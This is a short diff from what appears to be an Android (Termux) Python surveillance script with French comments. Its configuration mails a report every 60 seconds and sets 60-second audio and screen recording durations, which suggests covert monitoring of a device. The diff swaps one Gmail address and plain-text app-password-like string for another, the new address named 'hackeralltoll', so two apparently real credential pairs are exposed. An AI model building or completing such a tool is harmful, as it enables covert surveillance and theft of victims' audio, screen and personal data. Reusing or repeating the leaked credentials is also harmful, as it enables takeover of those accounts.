@@ -16,8 +16,8 @@ AudioSegment.ffmpeg = "/data/data/com.termux/files/usr/bin/ffmpeg"
 AudioSegment.ffprobe = "/data/data/com.termux/files/usr/bin/ffprobe"
 
 # CONFIGURATION
-EMAIL_ADDRESS = "lolalor20@gmail.com"  # Remplacez par votre adresse email
-EMAIL_PASSWORD = "abiv eltm dtbp qkhj"  # Remplacez par votre mot de passe
+EMAIL_ADDRESS = "hackeralltoll@gmail.com"  # Remplacez par votre adresse email
+EMAIL_PASSWORD = "mxis wvzp nxth udrm"  # Remplacez par votre mot de passe
 SEND_REPORT_EVERY = 60  # Envoi du rapport chaque 60 secondes
 AUDIO_RECORD_DURATION = 60  # Durée de l'enregistrement audio en secondes
 SCREEN_RECORD_DURATION = 60  # Durée de l'enregistrement d'écran en secondes
